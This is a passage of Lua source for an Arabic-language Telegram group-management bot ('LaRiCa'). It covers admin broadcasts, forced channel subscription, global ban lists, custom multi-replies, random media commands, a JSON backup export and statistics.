local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(LaRiCa.."Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
LuaTele.sendText(msg_chat_id,msg_id,"• ارسل لي التوجيه الان\n• ليتم نشره في المجموعات","md",true)  
return false
end
if text == 'اذاعه بالتوجيه خاص' or text == 'اذاعه بالتوجيه خاص •' then 
if not msg.Dev then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(3)..'* ',"md",true)  
end
if not msg.ControllerBot and not Redis:set(LaRiCa.."SendBcBot") then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• امر المغادره معطل من قبل الاساسي ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(LaRiCa.."Broadcasting:Users:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
LuaTele.sendText(msg_chat_id,msg_id,"• ارسل لي التوجيه الان\n• ليتم نشره الى المشتركين","md",true)  
return false
end
if text == 'اذاعه للمجموعات •' or text == 'اذاعه للمجموعات' then 
if not msg.Dev then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(3)..'* ',"md",true)  
end
if not msg.ControllerBot and not Redis:set(LaRiCa.."SendBcBot") then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• امر المغادره معطل من قبل الاساسي ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(LaRiCa.."Broadcasting:Groups" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
LuaTele.sendText(msg_chat_id,msg_id,[[
⍖ ارسل لي سواء كان
❨ ملف ، ملصق ، متحركه ، صوره
 ، فيديو ، بصمه الفيديو ، بصمه ، صوت ، رساله ❩
ٴ— — — — — — — — — —
⍖ للخروج ارسل ( الغاء )
 ✓
]],"md",true)  
return false
end
if text == 'اذاعه خاص •' or text == 'اذاعه خاص' then 
if not msg.Dev then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(3)..'* ',"md",true)  
end
if not msg.ControllerBot and not Redis:set(LaRiCa.."SendBcBot") then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• امر المغادره معطل من قبل الاساسي ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(LaRiCa.."Broadcasting:Users" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
LuaTele.sendText(msg_chat_id,msg_id,[[
⍖ ارسل لي سواء كان
❨ ملف ، ملصق ، متحركه ، صوره
 ، فيديو ، بصمه الفيديو ، بصمه ، صوت ، رساله ❩
ٴ— — — — — — — — — —
⍖ للخروج ارسل ( الغاء )
 ✓
]],"md",true)  
return false
end
if text == 'اذاعه بالتثبيت •' or text == 'اذاعه بالتثبيت' then
if not msg.Dev then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(3)..'* ',"md",true)  
end
if not msg.ControllerBot and not Redis:set(LaRiCa.."SendBcBot") then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• امر الاذاعه معطل من قبل الاساسي ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(LaRiCa.."LaRiCa:Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
LuaTele.sendText(msg_chat_id,msg_id,[[
⍖ ارسل لي سواء كان
❨ ملف • ملصق • متحركه • صوره
 • فيديو • بصمه الفيديو • بصمه • صوت • رساله ❩
━━━━━
⍖ للخروج ارسل ( الغاء )
 ✓
]],"md",true)  
return false
end 
---------------اذاعة-----------------
if text == 'تعطيل الاشتراك الاجباري لكل الاعضاء •' or text == 'تعطيل الاشتراك الاجباري لكل الاعضاء' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if not Redis:get(LaRiCa.."chmembers") then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• الامر معطل بالفعل* ',"md",true)  
end
Redis:del(LaRiCa.."chmembers")
LuaTele.sendText(msg_chat_id,msg_id,'\n*• تم تعطيل وضع الاشتراك الاجباري لكل الاعضاء اصبح عند استخدام اوامر البوت فقط* ',"md",true)  
end
if text == 'تعطيل الاشتراك الاجباري •' or text == 'تعطيل الاشتراك الاجباري' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
Redis:del(LaRiCa.."ch:admin")
Redis:del(LaRiCa.."chfalse")
LuaTele.sendText(msg_chat_id,msg_id,'• تم حذف القناه ',"md",true)  
end
if text == 'قائمه العام •' or text == 'قائمه العام' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."BanAll:Groups") 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد محظورين عام حاليا , ","md",true)  
end
ListMembers = '\n*• قائمه المحظورين عام  \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
var(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح المحظورين عام', data = msg.sender.user_id..'/BanAll'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text and text:match("^(.*)$") then
if Redis:get(LaRiCa.."LaRiCa11:Set:Rd"..msg.sender.user_id..":"..msg.chat_id) == "true" then
Redis:set(LaRiCa.."LaRiCa11:Set:Rd"..msg.sender.user_id..":"..msg.chat_id, "true1")
Redis:set(LaRiCa.."LaRiCa11:Text:Sudo:Bot"..msg.sender.user_id..":"..msg.chat_id, text)
Redis:sadd(LaRiCa.."LaRiCa11:List:Rd:Sudo", text)
LuaTele.sendText(msg_chat_id,msg_id, '\n• ارسل الكلمه الان')
return false end
end
if text and text:match("^(.*)$") then
if Redis:get(LaRiCa.."LaRiCa11:Set:On"..msg.sender.user_id..":"..msg.chat_id) == "true" then
Redis:del(LaRiCa..'LaRiCa11:Add:Rd:Sudo:Text'..text)
Redis:del(LaRiCa..'LaRiCa11:Add:Rd:Sudo:Text1'..text)
Redis:del(LaRiCa..'LaRiCa11:Add:Rd:Sudo:Text2'..text)
Redis:del(LaRiCa.."LaRiCa11:Set:On"..msg.sender.user_id..":"..msg.chat_id)
Redis:srem(LaRiCa.."LaRiCa11:List:Rd:Sudo", text)
 LuaTele.sendText(msg_chat_id,msg_id,"• تم حذف الرد من الردود المتعدده العامه")
return false
end
end
if text == ("مسح الردود المتعدده عام") then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
local list = Redis:smembers(LaRiCa.."LaRiCa11:List:Rd:Sudo")
for k,v in pairs(list) do  
Redis:del(LaRiCa.."LaRiCa11:Add:Rd:Sudo:Text"..v) 
Redis:del(LaRiCa.."LaRiCa11:Add:Rd:Sudo:Text1"..v) 
Redis:del(LaRiCa.."LaRiCa11:Add:Rd:Sudo:Text2"..v)   
Redis:del(LaRiCa.."LaRiCa11:List:Rd:Sudo")
end
LuaTele.sendText(msg_chat_id,msg_id,"• تم حذف الردود المتعدده العامه")
end
if text == ("الردود المتعدده عام") then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
local list = Redis:smembers(LaRiCa.."LaRiCa11:List:Rd:Sudo")
text = "\n• قائمه الردود المتعدده العامه\n━━━━━━━━\n"
for k,v in pairs(list) do
db = "رساله "
text = text..""..k.." => "..v.." => "..db.."\n"
end
if #list == 0 then
text = "• لا توجد ردود متعدده عام"
end
LuaTele.sendText(msg_chat_id,msg_id,""..text.."")
end
if text == "اضف رد متعدد عام" then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
Redis:set(LaRiCa.."LaRiCa11:Set:Rd"..msg.sender.user_id..":"..msg.chat_id,true)
return  LuaTele.sendText(msg_chat_id,msg_id,"ارسل الرد الذي اريد اضافته")
end
if text == "حذف رد متعدد عام" then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
Redis:set(LaRiCa.."LaRiCa11:Set:On"..msg.sender.user_id..":"..msg.chat_id,true)
return  LuaTele.sendText(msg_chat_id,msg_id,"• ارسل الكلمه التي تريد حذفها")
end
if text then  
local test = Redis:get(LaRiCa.."LaRiCa11:Text:Sudo:Bot"..msg.sender.user_id..":"..msg.chat_id)
if Redis:get(LaRiCa.."LaRiCa11:Set:Rd"..msg.sender.user_id..":"..msg.chat_id) == "true1" then
Redis:set(LaRiCa.."LaRiCa11:Set:Rd"..msg.sender.user_id..":"..msg.chat_id,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
Redis:set(LaRiCa.."LaRiCa11:Add:Rd:Sudo:Text"..test, text)  
end  
 LuaTele.sendText(msg_chat_id,msg_id,"• تم حفظ الرد الاول ارسل الرد الثاني")
return false  
end  
end
if text then  
local test = Redis:get(LaRiCa.."LaRiCa11:Text:Sudo:Bot"..msg.sender.user_id..":"..msg.chat_id)
if Redis:get(LaRiCa.."LaRiCa11:Set:Rd"..msg.sender.user_id..":"..msg.chat_id) == "rd1" then
Redis:set(LaRiCa.."LaRiCa11:Set:Rd"..msg.sender.user_id..":"..msg.chat_id,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
Redis:set(LaRiCa.."LaRiCa11:Add:Rd:Sudo:Text1"..test, text)  
end  
LuaTele.sendText(msg_chat_id,msg_id,"• تم حفظ الرد الثاني ارسل الرد الثالث")
return false  
end  
end
if text then  
local test = Redis:get(LaRiCa.."LaRiCa11:Text:Sudo:Bot"..msg.sender.user_id..":"..msg.chat_id)
if Redis:get(LaRiCa.."LaRiCa11:Set:Rd"..msg.sender.user_id..":"..msg.chat_id) == "rd2" then
Redis:set(LaRiCa.."LaRiCa11:Set:Rd"..msg.sender.user_id..":"..msg.chat_id,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
Redis:set(LaRiCa.."LaRiCa11:Add:Rd:Sudo:Text2"..test, text)  
end  
LuaTele.sendText(msg_chat_id,msg_id,"• تم حفظ الرد المتعدد العام بنجاح")
return false  
end  
end
if text then
local Text = Redis:get(LaRiCa.."LaRiCa11:Add:Rd:Sudo:Text"..text)   
local Text1 = Redis:get(LaRiCa.."LaRiCa11:Add:Rd:Sudo:Text1"..text)   
local Text2 = Redis:get(LaRiCa.."LaRiCa11:Add:Rd:Sudo:Text2"..text)   
if Text or Text1 or Text2 then 
local texting = {Text,Text1,Text2}
Textes = math.random(#texting)
 LuaTele.sendText(msg_chat_id,msg_id,texting[Textes])
end
end
if text == 'مسح قائمه العام •' or text == 'مسح قائمه العام' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."BanAll:Groups") 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد محظورين عام حاليا , ","md",true)  
end
Redis:del(LaRiCa.."BanAll:Groups") 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من المحظورين عام*","md",true)
end
if text == 'مسح الردود العامه •' or text == 'مسح الردود العامه' then 
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هاذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/LaRiCaTeam'}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(LaRiCa.."List:Rd:Sudo")
for k,v in pairs(list) do
Redis:del(LaRiCa.."Add:Rd:Sudo:Gif"..v)
Redis:del(LaRiCa.."Add:Rd:Sudo:vico"..v)
Redis:del(LaRiCa.."Add:Rd:Sudo:stekr"..v)
Redis:del(LaRiCa.."Add:Rd:Sudo:Text"..v)
Redis:del(LaRiCa.."Add:Rd:Sudo:Photo"..v)
Redis:del(LaRiCa.."Add:Rd:Sudo:Photoc"..v)
Redis:del(LaRiCa.."Add:Rd:Sudo:Video"..v)
Redis:del(LaRiCa.."Add:Rd:Sudo:Videoc"..v)
Redis:del(LaRiCa.."Add:Rd:Sudo:File"..v)
Redis:del(LaRiCa.."Add:Rd:Sudo:Audio"..v)
Redis:del(LaRiCa.."Add:Rd:Sudo:Audioc"..v)
Redis:del(LaRiCa.."Add:Rd:Sudo:video_note"..v)
Redis:del(LaRiCa.."List:Rd:Sudo")
end
LuaTele.sendText(msg_chat_id,msg_id,"• تم مسح قائمه الردود العامه","md",true)  
end
if text == 'اضف رد عام •' or text == 'اضف رد عام' then 
if not msg.Devss then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Set:Rd"..msg.sender.user_id..":"..msg_chat_id,true)
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{{text = 'الغاء الامر', data = msg.sender.user_id..'/cancelrdd'},},
}}
return LuaTele.sendText(msg_chat_id,msg_id,"• ارسل الان الكلمه لاضافتها في الردود العامه ","md",false, false, false, false, reply_markup)
end 
if text == 'حذف رد عام •' or text == 'حذف رد عام' then 
if not msg.Devss then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Set:On"..msg.sender.user_id..":"..msg_chat_id,true)
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{{text = 'الغاء الامر', data = msg.sender.user_id..'/cancelrdd'},},
}}
return LuaTele.sendText(msg_chat_id,msg_id,"• ارسل الان الكلمه لحذفها من الردود العامه","md",false, false, false, false, reply_markup)
end 
if text and not Redis:sismember(LaRiCa.."Spam:Group"..msg.sender.user_id,text) then
Redis:del(LaRiCa.."Spam:Group"..msg.sender.user_id) 
end
if text == 'تفعيل الاشتراك الاجباري لكل الاعضاء •' or text == 'تفعيل الاشتراك الاجباري لكل الاعضاء' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if not Redis:get(LaRiCa.."chfalse") then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• عذرا عليك تعيين قناه للاشتراك الاجباري اولا* ',"md",true)  
end
Redis:set(LaRiCa.."chmembers","on")
LuaTele.sendText(msg_chat_id,msg_id,'\n*• تم تفعيل وضع الاشتراك لكل الاعضاء* ',"md",true)  
end
if text == 'تفعيل الاشتراك الاجباري •' or text == 'تفعيل الاشتراك الاجباري' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
Redis:set(LaRiCa.."ch:addd"..msg.sender.user_id,"on")
LuaTele.sendText(msg_chat_id,msg_id,'• ارسل الان معرف القناه ',"md",true)  
end

if text == "متحركه" then
Abs = math.random(2,140); 
local Text ='*• تم اختيار متحركه لك*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'source 𝘓𝘢𝘙𝘐𝘤𝘈 ',url="https://t.me/LaRiCaTEAM"}},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendanimation?chat_id=' .. msg.chat_id .. '&animation=https://t.me/GifDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "شعر" then
Abs = math.random(2,140); 
local Text ='*• تم اختيار الشعر لك فقط*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'source 𝘓𝘢𝘙𝘐𝘤𝘈 ',url="https://t.me/LaRiCaTEAM"}},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/L1BBBL/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "ميمز" then
Abs = math.random(2,140); 
local Text ='*• تم اختيار الميمز لك فقط*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'source 𝘓𝘢𝘙𝘐𝘤𝘈 ',url="https://t.me/LaRiCaTEAM"}},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/hhjhguio/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "تيك" or text == "تيك توك" then 
Abs = math.random(2,140); 
local Text ='*• تم تحميل *'
local keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = 'source 𝘓𝘢𝘙𝘐𝘤𝘈 ', url = "https://t.me/LaRiCaTEAM"}
},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/Laksoe/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboardd)) 
end
if text == "فيلم" or text == "فلم" then 
Abs = math.random(2,140); 
local Text ='*• تم اختيار الفلم لك*'
local keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = 'source 𝘓𝘢𝘙𝘐𝘤𝘈 ', url = "https://t.me/LaRiCaTEAM"}
},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/MoviesDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboardd)) 
end
if text == "انمي" or text == "انميي" then 
Abs = math.random(2,140); 
local Text ='*• تم اختيار انمي لك*'
local keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = 'source 𝘓𝘢𝘙𝘐𝘤𝘈 ', url = "https://t.me/LaRiCaTEAM"}
},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/AnimeDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboardd)) 
end
if text == "اغنيه" then
Abs = math.random(2,140); 
local Text ='*• تم اختيار الاغنيه لك*'
local keyboardd = {} 
keyboard.inline_keyboard = {
{{text = 'source 𝘓𝘢𝘙𝘐𝘤𝘈 ',url="https://t.me/LaRiCaTEAM"}},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/pvv_v/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboardd)) 
end
if text == "صوره" or text == "صورة" then
Abs = math.random(2,140); 
local Text ='*• تم اختيار صور*'
local keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = 'source 𝘓𝘢𝘙𝘐𝘤𝘈 ', url = "https://t.me/LaRiCaTEAM"}
},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/PhotosDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboardd)) 
end

if text == 'جلب النسخه الاحتياطيه •' or text == 'جلب نسخه احتياطيه' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Groups = Redis:smembers(LaRiCa..'ChekBotAdd')  
local UsersBot = Redis:smembers(LaRiCa..'Num:User:Pv')  
local Get_Json = '{"BotId": '..LaRiCa..','  
if #UsersBot ~= 0 then 
Get_Json = Get_Json..'"UsersBot":['  
for k,v in pairs(UsersBot) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..']'
end
Get_Json = Get_Json..',"GroupsBot":{'
for k,v in pairs(Groups) do   
local President = Redis:smembers(LaRiCa.."Supcreator:Group"..v)
local Constructor = Redis:smembers(LaRiCa.."Creator:Group"..v)
local Manager = Redis:smembers(LaRiCa.."Manger:Group"..v)
local Admin = Redis:smembers(LaRiCa.."Admin:Group"..v)
local Vips = Redis:smembers(LaRiCa.."Special:Group"..v)
if k == 1 then
Get_Json = Get_Json..'"'..v..'":{'
else
Get_Json = Get_Json..',"'..v..'":{'
end
if #President ~= 0 then 
Get_Json = Get_Json..'"President":['
for k,v in pairs(President) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
if #Constructor ~= 0 then
Get_Json = Get_Json..'"Constructor":['
for k,v in pairs(Constructor) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
if #Manager ~= 0 then
Get_Json = Get_Json..'"Manager":['
for k,v in pairs(Manager) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
if #Admin ~= 0 then
Get_Json = Get_Json..'"Admin":['
for k,v in pairs(Admin) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
if #Vips ~= 0 then
Get_Json = Get_Json..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
Get_Json = Get_Json..'"Dev":"JAI6H"}'
end
Get_Json = Get_Json..'}}'
local File = io.open('./'..UserBot..'.json', "w")
File:write(Get_Json)
File:close()
return LuaTele.sendDocument(msg_chat_id,msg_id,'./'..UserBot..'.json', '*• تم جلب النسخه الاحتياطيه\n• تحتوي على {'..#Groups..'} كروب \n• وتحتوي على {'..#UsersBot..'} مشترك*\n', 'md')
end
if text and text:match("^تعين عدد الاعضاء (%d+)$") then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa..'Num:Add:Bot',text:match("تعين عدد الاعضاء (%d+)$") ) 
LuaTele.sendText(msg_chat_id,msg_id,'*• تم تعيين عدد اعضاء تفعيل البوت اكثر من : '..text:match("تعين عدد الاعضاء (%d+)$")..' عضو*',"md",true)  
elseif text =='الاحصائيات' then 
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
LuaTele.sendText(msg_chat_id,msg_id,'*• عدد احصائيات البوت الكامله \nٴ— — — — — — — — — —\n• عدد المجموعات : '..(Redis:scard(LaRiCa..'ChekBotAdd') or 0)..'\n• عدد المشتركين : '..(Redis:scard(LaRiCa..'Num:User:Pv') or 0)..'*',"md",true)  
end
if text == 'تفعيل' and msg.Dev then
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
local Info_Chats = LuaTele.getSupergroupFullInfo(msg_chat_id)
if tonumber(Info_Chats.member_count) < tonumber((Redis:get(LaRiCa..'Num:Add:Bot') or 0)) and not msg.ControllerBot then
return LuaTele.sendText(msg_chat_id,msg_id,'• عدد الاعضاء قليل لا يمكن تفعيل الكروب  يجب ان يكوم اكثر من :'..Redis:get(LaRiCa..'Num:Add:Bot'),"md",true)  
end
local Get_Chat = LuaTele.getChat(msg_chat_id)
if Redis:sismember(LaRiCa.."ChekBotAdd",msg_chat_id) then
